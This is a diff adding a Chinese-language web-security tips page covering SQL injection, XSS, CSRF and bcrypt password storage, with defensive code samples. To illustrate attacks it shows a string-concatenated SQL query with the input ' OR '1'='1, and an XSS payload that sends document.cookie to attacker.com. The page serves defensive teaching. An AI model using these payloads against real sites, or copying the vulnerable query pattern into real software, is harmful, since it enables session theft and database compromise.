@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>安全防护技巧 - 技术知识</title>
+    <link rel="stylesheet" href="./css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --main: #165DFF;
+            --main-dark: #0e40e0;
+            --light: #f5f7fa;
+            --text: #333;
+            --text-light: #666;
+            --success: #52c41a;
+            --danger: #ff4d4f;
+            --warning: #faad14;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #f5f7fa;
+            color: var(--text);
+            line-height: 1.6;
+        }
+        .header {
+            background: linear-gradient(135deg, #165DFF 0%, #0e40e0 100%);
+            color: white;
+            padding: 60px 20px;
+            text-align: center;
+        }
+        .header h1 { margin: 0 0 10px; font-size: 2.5em; }
+        .header p { margin: 0; opacity: 0.9; font-size: 1.1em; }
+        .breadcrumb {
+            max-width: 1200px;
+            margin: 20px auto;
+            padding: 0 20px;
+            font-size: 14px;
+            color: var(--text-light);
+        }
+        .breadcrumb a { color: var(--main); text-decoration: none; }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        .nav-cards {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 40px;
+        }
+        .nav-card {
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+            text-decoration: none;
+            color: var(--text);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+            transition: all 0.3s ease;
+        }
+        .nav-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 16px rgba(22,93,255,0.15);
+        }
+        .nav-card.active { background: var(--main); color: white; }
+        .nav-card i { font-size: 28px; margin-bottom: 10px; color: var(--main); }
+        .nav-card.active i { color: white; }
+        .nav-card h4 { margin: 0; font-size: 15px; }
+        .security-card {
+            background: white;
+            border-radius: 16px;
+            padding: 30px;
+            margin-bottom: 25px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+            border-left: 5px solid var(--main);
+        }
+        .security-card.sql-injection { border-left-color: var(--danger); }
+        .security-card.xss { border-left-color: var(--warning); }
+        .security-card.csrf { border-left-color: #722ed1; }
+        .security-card.password { border-left-color: var(--success); }
+        .security-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .security-icon {
+            width: 60px;
+            height: 60px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 20px;
+            font-size: 28px;
+        }
+        .sql-injection .security-icon { background: #fff1f0; color: var(--danger); }
+        .xss .security-icon { background: #fff7e6; color: var(--warning); }
+        .csrf .security-icon { background: #f9f0ff; color: #722ed1; }
+        .password .security-icon { background: #f6ffed; color: var(--success); }
+        .security-header h2 { margin: 0; font-size: 1.5em; }
+        .security-header span {
+            font-size: 14px;
+            color: var(--text-light);
+        }
+        .threat-box, .solution-box {
+            padding: 20px;
+            border-radius: 10px;
+            margin: 15px 0;
+        }
+        .threat-box {
+            background: #fff1f0;
+            border: 1px solid #ffccc7;
+        }
+        .threat-box h4 { color: var(--danger); margin: 0 0 10px; }
+        .solution-box {
+            background: #f6ffed;
+            border: 1px solid #b7eb8f;
+        }
+        .solution-box h4 { color: var(--success); margin: 0 0 10px; }
+        .code-block {
+            background: #1e1e1e;
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin: 15px 0;
+        }
+        .code-block pre {
+            margin: 0;
+            color: #d4d4d4;
+            font-family: "Fira Code", "Consolas", monospace;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        .code-comment { color: #6a9955; }
+        .code-keyword { color: #569cd6; }
+        .code-string { color: #ce9178; }
+        .code-function { color: #dcdcaa; }
+        .code-class { color: #4ec9b0; }
+        .tips-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+        .tip-item {
+            background: var(--light);
+            padding: 20px;
+            border-radius: 10px;
+        }
+        .tip-item h4 {
+            color: var(--main);
+            margin: 0 0 10px;
+        }
+        footer {
+            text-align: center;
+            padding: 30px;
+            color: var(--text-light);
+            font-size: 14px;
+            margin-top: 40px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1><i class="fas fa-shield-alt"></i> 安全防护技巧</h1>
+        <p>防止常见安全漏洞，保护系统安全</p>
+    </div>
+
+    <div class="breadcrumb">
+        <a href="index.html">首页</a> &gt; <a href="tech-knowledge.html">技术知识</a> &gt; 安全防护
+    </div>
+
+    <div class="container">
+        <div class="nav-cards">
+            <a href="software-principles.html" class="nav-card">
+                <i class="fas fa-gem"></i>
+                <h4>6大设计原则</h4>
+            </a>
+            <a href="design-patterns.html" class="nav-card">
+                <i class="fas fa-cubes"></i>
+                <h4>12种设计模式</h4>
+            </a>
+            <a href="security-tips.html" class="nav-card active">
+                <i class="fas fa-shield-alt"></i>
+                <h4>安全防护</h4>
+            </a>
+            <a href="dev-tips.html" class="nav-card">
+                <i class="fas fa-lightbulb"></i>
+                <h4>开发技巧</h4>
+            </a>
+            <a href="mysql-optimization.html" class="nav-card">
+                <i class="fas fa-database"></i>
+                <h4>MySQL优化</h4>
+            </a>
+        </div>
+
+        <!-- SQL注入防护 -->
+        <div class="security-card sql-injection">
+            <div class="security-header">
+                <div class="security-icon"><i class="fas fa-database"></i></div>
+                <div>
+                    <h2>SQL注入防护</h2>
+                    <span>SQL Injection Prevention</span>
+                </div>
+            </div>
+
+            <div class="threat-box">
+                <h4><i class="fas fa-exclamation-triangle"></i> 攻击原理</h4>
+                <p>攻击者通过在用户输入中注入恶意SQL代码，绕过验证或执行未授权的数据库操作。</p>
+                <div class="code-block">
+<pre><span class="code-comment">// 恶意输入：' OR '1'='1</span>
+String sql = <span class="code-string">"SELECT * FROM users WHERE name='" + name + "' AND pwd='" + pwd + "'"</span>;
+<span class="code-comment">// 最终变成：SELECT * FROM users WHERE name='' OR '1'='1' AND pwd='' OR '1'='1'</span></pre>
+                </div>
+            </div>
+
+            <div class="solution-box">
+                <h4><i class="fas fa-check-circle"></i> 防护方案：参数化查询</h4>
+                <div class="code-block">
+<pre><span class="code-comment">// C# - 使用参数化查询</span>
+<span class="code-keyword">string</span> sql = <span class="code-string">"SELECT * FROM users WHERE name = @name AND pwd = @pwd"</span>;
+<span class="code-keyword">using</span> (<span class="code-class">SqlCommand</span> cmd = <span class="code-keyword">new</span> <span class="code-class">SqlCommand</span>(sql, conn)) {
+    cmd.Parameters.AddWithValue(<span class="code-string">"@name"</span>, name);
+    cmd.Parameters.AddWithValue(<span class="code-string">"@pwd"</span>, pwd);
+    cmd.ExecuteReader();
+}</pre>
+                </div>
+                <div class="code-block">
+<pre><span class="code-comment">// Java - 使用 PreparedStatement</span>
+<span class="code-keyword">String</span> sql = <span class="code-string">"SELECT * FROM users WHERE name = ? AND pwd = ?"</span>;
+<span class="code-class">PreparedStatement</span> ps = conn.<span class="code-function">prepareStatement</span>(sql);
+ps.<span class="code-function">setString</span>(<span class="code-number">1</span>, name);
+ps.<span class="code-function">setString</span>(<span class="code-number">2</span>, pwd);
+ResultSet rs = ps.<span class="code-function">executeQuery</span>();</pre>
+                </div>
+                <div class="code-block">
+<pre><span class="code-comment">// Python - 使用 ORM (SQLAlchemy)</span>
+result = db.session.<span class="code-function">execute</span>(
+    <span class="code-class">User</span>.__table__.select().<span class="code-function">where</span>(
+        <span class="code-class">User</span>.name == name,
+        <span class="code-class">User</span>.pwd == pwd
+    )
+)</pre>
+                </div>
+            </div>
+
+            <div class="tips-grid">
+                <div class="tip-item">
+                    <h4><i class="fas fa-ban"></i> 禁止的做法</h4>
+                    <ul>
+                        <li>字符串拼接SQL</li>
+                        <li>直接执行用户输入</li>
+                        <li>使用管理员权限连接数据库</li>
+                        <li>在生产环境显示详细错误</li>
+                    </ul>
+                </div>
+                <div class="tip-item">
+                    <h4><i class="fas fa-check"></i> 最佳实践</h4>
+                    <ul>
+                        <li>始终使用参数化查询</li>
+                        <li>使用ORM框架</li>
+                        <li>最小权限原则配置数据库账户</li>
+                        <li>输入验证 + 白名单过滤</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- XSS防护 -->
+        <div class="security-card xss">
+            <div class="security-header">
+                <div class="security-icon"><i class="fas fa-code"></i></div>
+                <div>
+                    <h2>XSS跨站脚本防护</h2>
+                    <span>Cross-Site Scripting Prevention</span>
+                </div>
+            </div>
+
+            <div class="threat-box">
+                <h4><i class="fas fa-exclamation-triangle"></i> 攻击原理</h4>
+                <p>攻击者向网页注入恶意JavaScript代码，当其他用户访问时执行窃取Cookie、会话令牌等。</p>
+                <div class="code-block">
+<pre><span class="code-comment">// 恶意输入</span>
+<span class="code-string">"&gt;&lt;script&gt;document.location='http://attacker.com?c='+document.cookie&lt;/script&gt;</span></pre>
+                </div>
+            </div>
+
+            <div class="solution-box">
+                <h4><i class="fas fa-check-circle"></i> 防护方案</h4>
+                <div class="code-block">
+<pre><span class="code-comment">// 1. HTML转义</span>
+<span class="code-keyword">public static</span> <span class="code-keyword">string</span> <span class="code-function">HtmlEncode</span>(<span class="code-keyword">string</span> input) {
+    <span class="code-keyword">return</span> <span class="code-class">System</span>.Web.<span class="code-class">HttpUtility</span>.<span class="code-function">HtmlEncode</span>(input);
+}
+<span class="code-comment">// < → &lt;  > → &gt;  " → &quot;  ' → &#39;</span>
+
+<span class="code-comment">// 2. 使用模板引擎默认转义</span>
+<span class="code-comment">// Thymeleaf: th:text (默认转义)  th:utext (不转义)</span>
+<span class="code-comment">// Vue: {{data}} (转义)  v-html (不转义，需慎用)</span>
+
+<span class="code-comment">// 3. Content Security Policy</span>
+<span class="code-class">Response</span>.Headers.<span class="code-function">Add</span>(<span class="code-string">"Content-Security-Policy"</span>, 
+    <span class="code-string">"script-src 'self'; style-src 'self' 'unsafe-inline'"</span>);</pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- CSRF防护 -->
+        <div class="security-card csrf">
+            <div class="security-header">
+                <div class="security-icon"><i class="fas fa-university"></i></div>
+                <div>
+                    <h2>CSRF跨站请求伪造防护</h2>
+                    <span>Cross-Site Request Forgery Prevention</span>
+                </div>
+            </div>
+
+            <div class="threat-box">
+                <h4><i class="fas fa-exclamation-triangle"></i> 攻击原理</h4>
+                <p>攻击者诱导已登录用户访问恶意页面，自动发送已认证的请求完成转账、修改密码等操作。</p>
+            </div>
+
+            <div class="solution-box">
+                <h4><i class="fas fa-check-circle"></i> 防护方案</h4>
+                <div class="code-block">
+<pre><span class="code-comment">// 1. CSRF Token</span>
+<span class="code-comment">// 服务器生成随机Token，表单中包含，提交时验证</span>
+<span class="code-keyword">string</span> csrfToken = <span class="code-class">Guid</span>.<span class="code-function">NewGuid</span>().<span class="code-function">ToString</span>();
+Session[<span class="code-string">"CSRF_Token"</span>] = csrfToken;
+<span class="code-comment">// 表单：&lt;input type="hidden" name="csrf_token" value="@csrfToken" /&gt;</span>
+
+<span class="code-comment">// 2. 验证请求来源</span>
+<span class="code-keyword">string</span> origin = Request.Headers[<span class="code-string">"Origin"</span>];
+<span class="code-keyword">if</span> (origin != <span class="code-string">"https://yoursite.com"</span>) {
+    <span class="code-keyword">return</span> <span class="code-class">BadRequest</span>(<span class="code-string">"CSRF验证失败"</span>);
+}
+
+<span class="code-comment">// 3. SameSite Cookie</span>
+<span class="code-class">Response</span>.Cookies.<span class="code-function">Append</span>(<span class="code-string">"session_id"</span>, sessionId, 
+    <span class="code-keyword">new</span> <span class="code-class">CookieOptions</span> { SameSite = <span class="code-class">SameSiteMode</span>.Strict });</pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- 密码安全 -->
+        <div class="security-card password">
+            <div class="security-header">
+                <div class="security-icon"><i class="fas fa-key"></i></div>
+                <div>
+                    <h2>密码安全存储</h2>
+                    <span>Secure Password Storage</span>
+                </div>
+            </div>
+
+            <div class="solution-box">
+                <h4><i class="fas fa-check-circle"></i> 最佳实践：BCrypt哈希</h4>
+                <div class="code-block">
+<pre><span class="code-comment">// .NET - 使用 BCrypt.Net-Next</span>
+<span class="code-comment">// 密码哈希（注册时）</span>
+<span class="code-keyword">string</span> hashedPassword = <span class="code-class">BCrypt</span>.<span class="code-function">HashPassword</span>(password);
+<span class="code-comment">// 第二个参数：work factor，越大越安全但越慢（建议10-12）</span>
+
+<span class="code-comment">// 密码验证（登录时）</span>
+<span class="code-keyword">bool</span> isValid = <span class="code-class">BCrypt</span>.<span class="code-function">Verify</span>(inputPassword, storedHash);</pre>
+                </div>
+                <div class="code-block">
+<pre><span class="code-comment">// Java - 使用 Spring Security BCrypt</span>
+<span class="code-class">BCryptPasswordEncoder</span> encoder = <span class="code-keyword">new</span> <span class="code-class">BCryptPasswordEncoder</span>();
+<span class="code-comment">// 密码哈希</span>
+<span class="code-keyword">String</span> hashed = encoder.<span class="code-function">encode</span>(password);
+<span class="code-comment">// 密码验证</span>
+<span class="code-keyword">boolean</span> matches = encoder.<span class="code-function">matches</span>(inputPassword, hashed);</pre>
+                </div>
+            </div>
+
+            <div class="tips-grid">
+                <div class="tip-item">
+                    <h4><i class="fas fa-ban"></i> 禁止的做法</h4>
+                    <ul>
+                        <li>明文存储密码</li>
+                        <li>使用MD5/SHA1哈希（已被破解）</li>
+                        <li>不使用盐值</li>
+                        <li>使用固定盐值</li>
+                    </ul>
+                </div>
+                <div class="tip-item">
+                    <h4><i class="fas fa-check"></i> 正确做法</h4>
+                    <ul>
+                        <li>使用BCrypt/Argon2/scrypt</li>
+                        <li>每个用户独立随机盐值</li>
+                        <li>设置合理的work factor</li>
+                        <li>登录失败锁定账户</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>&copy; 2026 技术知识库 | <a href="tech-knowledge.html">返回技术知识总览</a></p>
+    </footer>
+</body>
+</html>
